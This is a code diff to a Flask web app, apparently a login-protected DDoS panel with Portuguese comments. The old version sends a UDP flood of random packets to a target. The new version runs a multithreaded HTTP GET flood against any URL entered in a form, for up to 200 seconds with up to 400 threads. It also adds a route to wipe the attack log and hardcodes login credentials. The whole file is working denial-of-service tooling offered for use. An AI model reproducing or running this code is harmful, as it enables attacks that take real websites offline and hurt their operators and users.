@@ -1,10 +1,8 @@
 from flask import Flask, render_template, request, redirect, url_for, session
 import threading
 import time
+import requests
 from datetime import datetime
-import socket
-import random
-import re
 import os
 
 app = Flask(__name__)
@@ -15,52 +13,35 @@ if not os.path.exists('logs'):
     os.makedirs('logs')
 
 # Login
-USERNAME = 'mcflyoperador123'
-PASSWORD = 'apenasumasenha12345'  # Pode trocar aqui se quiser
+USERNAME = 'mcflyoperador'
+PASSWORD = 'senhapadrao1234'
 
-# Limite máximo de threads
-MAX_THREADS = 500
-
-
-# ==========================
-# Limpa HTTPS da URL
-# ==========================
-def sanitize_url(url):
-    url = re.sub(r'^https?://', '', url)
-    url = url.strip().split('/')[0]
-    return url
-
-
-# ==========================
-# Função de ataque
-# ==========================
+# Função de ataque real (GET request massivo)
 def ataque(url, tempo, threads):
     fim = time.time() + tempo
-    target = sanitize_url(url)
 
-    try:
-        ip = socket.gethostbyname(target)
-    except Exception as e:
-        print(f"[ERRO] Domínio inválido: {target}")
-        return
-
-    bytes_data = random._urandom(1024)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    while time.time() < fim:
-        for _ in range(threads):
+    def flood():
+        while time.time() < fim:
             try:
-                sock.sendto(bytes_data, (ip, 80))
+                requests.get(url, timeout=3)
+                print(f"Enviado para {url}")
             except:
                 pass
-        time.sleep(0.5)
 
-    gerar_log(target)
+    thread_list = []
+
+    for _ in range(threads):
+        t = threading.Thread(target=flood)
+        t.start()
+        thread_list.append(t)
+
+    for t in thread_list:
+        t.join()
+
+    gerar_log(url)
 
 
-# ==========================
 # Gera relatório
-# ==========================
 def gerar_log(url):
     agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
     codigo = os.urandom(4).hex().upper()
@@ -70,16 +51,14 @@ def gerar_log(url):
         f.write(log)
 
 
-# ==========================
-# Rotas principais
-# ==========================
+# Rotas
+
 @app.route('/')
 def home():
     if 'logged_in' in session:
         return render_template('index.html')
     else:
         return redirect(url_for('login'))
-
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -92,19 +71,20 @@ def login():
             return render_template('login.html', erro='Credenciais incorretas')
     return render_template('login.html')
 
-
 @app.route('/logout')
 def logout():
     session.pop('logged_in', None)
     return redirect(url_for('login'))
 
-
 @app.route('/ataque', methods=['POST'])
 def iniciar_ataque():
     if 'logged_in' in session:
         url = request.form['url']
-        tempo = min(int(request.form['tempo']), 200)  # Limite máximo de tempo = 200 segundos
-        threads = min(int(request.form['threads']), MAX_THREADS)  # Máximo de 500 threads
+        if not url.startswith('http'):
+            url = 'http://' + url
+
+        tempo = min(int(request.form['tempo']), 200)
+        threads = min(int(request.form['threads']), 400)
 
         thread = threading.Thread(target=ataque, args=(url, tempo, threads))
         thread.start()
@@ -113,22 +93,25 @@ def iniciar_ataque():
     else:
         return redirect(url_for('login'))
 
-
 @app.route('/logs')
-def logs():
+def ver_logs():
     if 'logged_in' in session:
-        if os.path.exists('logs/relatorio.txt'):
-            with open('logs/relatorio.txt', 'r') as file:
-                conteudo = file.read()
-        else:
-            conteudo = "Nenhum log encontrado."
+        try:
+            with open('logs/relatorio.txt', 'r') as f:
+                conteudo = f.read()
+        except FileNotFoundError:
+            conteudo = ''
         return render_template('logs.html', logs=conteudo)
     else:
         return redirect(url_for('login'))
 
+@app.route('/limpar_logs')
+def limpar_logs():
+    if 'logged_in' in session:
+        open('logs/relatorio.txt', 'w').close()
+        return redirect(url_for('ver_logs'))
+    else:
+        return redirect(url_for('login'))
 
-# ==========================
-# Executar o app
-# ==========================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
